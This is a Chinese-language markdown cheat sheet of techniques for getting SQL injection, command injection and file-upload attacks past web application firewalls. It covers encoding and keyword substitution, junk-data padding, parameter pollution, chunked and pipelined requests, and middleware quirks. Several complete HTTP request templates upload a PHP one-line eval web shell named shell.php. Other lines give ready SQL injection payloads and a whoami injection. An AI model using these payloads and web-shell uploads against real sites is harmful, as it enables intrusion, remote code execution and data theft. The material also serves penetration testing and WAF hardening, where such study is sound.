# 字符变换

## 大小写
  - Union select = uNIoN sELecT

## 双写
  - ununionion -> 后端过滤union -> union

## 编码
- select * from zzz = select * from %257a%257a%257a //url编码
- 单引号 = %u0027、%u02b9、%u02bc   // Unicode编码
- adminuser = 0x61646D696E75736572 // 部分十六进制编码
- 空格 = %20 %09 %0a %0b %0c %0d %a0 //各类编码

## 注释
在sql注入中，如mysql中的内联注释，可以用来代替空格。

注释也可以和换行搭配使用，注释掉后面的内容，再通过换行逃逸到注释之外

  - `xxx.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2`

![image](https://user-images.githubusercontent.com/84888757/167177577-79165f91-2308-4d4e-8539-e38121b1be26.png)

## 关键字替换
- sqli
  - And = &&
  - Or = ||
  - 等于 = like 或综合<与>判断
  - if(a,b,c) = case when(A) then B else C end
  - substr(str,1,1) = substr (str) from 1 for 1
  - limit 1,1 = limit 1 offset 1
  - Union select 1,2 = union select * from ((select 1)A join (select 2)B;
  - hex()、bin() = ascii()
  - sleep() = benchmark()
  - concat_ws() = group_concat()
  - mid()、substr() = substring()
  - @@user = user()
  - @@datadir = datadir()
- 文件上传
  - php = phtml、php3、php4、php5、pht、phps

# Waf检测限制绕过
原理：超出waf检测能力部分不会拦截。

## 垃圾字符
原理：一些WAF设置了过滤的数据包长度，如果数据包太大太长，为了考虑性能就会直接略过这个数据包。
- 文件上传
  - name与filename之间插入垃圾数据
    - 注：需在大量垃圾数据后加 `;`
```
POST /index.php HTTP/1.1
Host: test.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; 
filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```

- 文件上传
  - boundary字符串中加入垃圾数据
    - boundray字符串的值可以为任何数据（有一定的长度限制），当长度达到WAF无法处理时，而Web服务器又能够处理，那么就可以绕过WAF上传文件。

```
POST /index.php HTTP/1.1
Host: test.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="upload_file";filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--
```

- 文件上传
  - boundray末尾插入垃圾数据

```
POST /index.php HTTP/1.1
Host: test.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="upload_file";filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9--
```

- 文件上传
  - multipart/form-data与boundary之间插入垃圾数据

```
POST /index.php HTTP/1.1
Host: test.com
Content-Type: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close
Content-Length: 319

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```


- sqli
```
GET /test?sqli=111...80万个1...111'+and+2*3=6+--+ HTTP/1.1
Host: Host
User-Agent: Mozilla/5.0
Accept: */*
```

## 参数溢出
原理：通过增加传递得参数数量，达到waf检测上限，超出的参数就可绕过waf了。可绕一些轻量级waf，如phpstudy自带waf。

🌰 在waf设置拦截关键字whoami

通过参数溢出成功执行whoami

```
POST /test HTTP/1.1
Host: Host
Content-Type: application/x-www-form-encoded

a=123&a=123&a=123&......200个&a=123......&=123&a=123&a=123&a=123&a=123&a=whoami
```

# HTTP协议绕过
## HTTP 0.9
HTTP 0.9协议只有GET方法，且没有HEADER信息等，WAF就可能认不出这种的请求包，于是达到绕过WAF的效果。
```
GET /foo?sqli=1 HTTP/0.9
User-Agent: Mozilla/5.0
Host: Host
Accept: */*
```
## 参数污染
存在多个同名参数的情况下，可能存在逻辑层和WAF层对参数的取值不同，即可能逻辑层使用的第一个参数，而WAF层使用的第二个参数，我们只需要第二个参数正常，在第一个参数插入payload，这样组合起来就可以绕过WAF，如下数据包：
```
GET /foo?par=first&par=last HTTP/1.1
User-Agent: Mozilla/5.0
Host: Host
Accept: */*
```
部分中间件的处理方法：
| Web环境          | 参数获取函数                | 获取到的参数     |
| ---------------- | --------------------------- | ---------------- |
| PHP/Apache       | $_GET("par")                | last             |
| JSP/Tomcat       | Request.getParameter("par") | first            |
| Perl(CGI)/Apache | Param("par")                | first            |
| Python/Apache    | getvalue("par")             | ["first","last"] |
| ASP.NET/IIS      | Request.QueryString("par")  | first,last       |



## HTTP charset
利用`Content-Type: xxx;charset=xxx`编码绕过，payload转义后，由于大部分的WAF默认用UTF8编码检测，所以能用此方法来达到绕过关键词过滤的效果。
```
application/x-www-form-urlencoded; charset=ibm037
multipart/form-data; charset=ibm037, boundary=blah
multipart/form-data; boundary=blah ; charset=ibm037
```

🌰 图自酒仙桥六号部队
![image](https://user-images.githubusercontent.com/84888757/167201867-64fe9444-8f9c-4a4a-9322-19acff5e8f5b.png)


## 分块传输
原理:分块传输编码是http的一种数据传输机制，允许http由网页服务器发送到客户端应用的数据进行分块发送。

burp插件：https://github.com/c0ny1/chunked-coding-converter


在头部加入 `Transfer-Encoding: chunked` 之后，就代表这个报文采用了分块编码。这时，post请求报文中的数据部分需要改为用一系列分块来传输。每个分块包含十六进制的长度值和数据，长度值独占一行，长度不包括它结尾的，也不包括分块数据结尾的，且最后需要用0独占一行表示结束。

🌰 图自酒仙桥六号部队

![image](https://user-images.githubusercontent.com/84888757/167204119-afb0b241-302e-4808-88d3-e78c5643774f.png)


## Pipeline（keep-alive）
http请求头部中有`Connection`这个字段，建立的tcp连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个http包容量，需要分多次发送时，值会变成keep-alive，即本次发起的http请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。

我们可以手动将此值置为`keep-alive`，然后在http请求报文中构造多个请求，将恶意代码隐藏在第n个请求中，从而绕过waf。

记得把brupsuite自动更新Content-Length的勾去掉：

![image](https://user-images.githubusercontent.com/84888757/167182347-92126f20-9f6f-4b93-be60-4e2ffe4887cd.png)

🌰 数据包举例如下：
```
POST /test.php HTTP/1.1
Host: www.xin.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3

id=2+order+by+2GET /test.php HTTP/1.1
Host: www.xin.com
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close

id=6
```

🌰 图自酒仙桥六号部队
![image](https://user-images.githubusercontent.com/84888757/167183959-cb65b392-9b96-4d92-903f-d2cd091ad2df.png)

## 多Content-Disposition绕过

请求包中包含多个Content-Disposition时，中间件与waf取值不同 。

🌰 图自酒仙桥六号部队
![image](https://user-images.githubusercontent.com/84888757/167205117-3cb7caf3-6508-44bf-aa33-b86a4fef7c44.png)


# WAF特性
## 云WAF绕过
- 找真实ip，修改本地hosts文件或者直接在burp（Project options -> Connections -> Hostname Resolution）中指定解析。

## 白名单绕过
一些WAF为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。

如：WAF设立了白名单/admin，那么我们的测试payload可以通过如下的手法来绕过

🌰 被拦截
`http://xin.com/?id=123 and2*3=6`

🌰 不拦截
`http://xin.com/?a=/admin&id=123 and2*3=6`

## 静态文件绕过
一些WAF为了减少服务器的压力，会对静态文件如`.jpg`、`.css`等直接放行，所以可以尝试伪装成静态文件来绕过。

🌰 被拦截
`http://xin.com/?id=123 and2*3=6`

🌰 不拦截
`http://xin.com/?1.jpg&id=123 and2*3=6`

## Content-Type绕过
一些WAF识别到特定的content-type后，则会判定为该请求的类型。

比如：发现`Content-Type`为`multipart/form-data`时，会认为这属于文件上传的请求，从而只检测文件上传漏洞，导致不拦截其他漏洞类型的payload。

## 请求方式绕过
一些WAF对于get请求和post请求的处理机制不一样，可能对POST请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。

一些WAF检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。

## 解析兼容性
一些WAF检测时，完全按照标准的HTTP协议去匹配，但WEB容器会做一些兼容性适配，如上传时
```
filename="shell.php"
```
我们只需要稍加修改，那么按照标准协议去解析就找不到文件名，从而绕过拦截
```
filename="shell.php
filename='shell.php'
filename=shell.php
filename=`test.php`
```

# 中间件特性
## IIS+ASP
%会被自动去掉

unicode会自动解码

🌰 `<script> == <%s%cr%u0131pt>`

## tomcat
路径穿越

🌰 `/path1/path2/ == ;/path1;foo/path2;bar/;`

# 参考链接
- [WAF绕过通用思路](https://www.freebuf.com/articles/network/324192.html)
- [waf绕过拍了拍你](https://www.anquanke.com/post/id/212272)
- [最全的文件上传漏洞之WAF拦截绕过总结 @Ulysses](https://mp.weixin.qq.com/s/FW93imGul0kNxbi2RhXBfA)
- [常见WAF的拦截页整理 @3had0w](https://mp.weixin.qq.com/s/1nlKhhAN0ZKRa0BkOqamSg)
- [命令执行绕过WAF总结，RCE常见的Bypass思路 @L3ife1](https://www.freebuf.com/articles/web/330736.html)
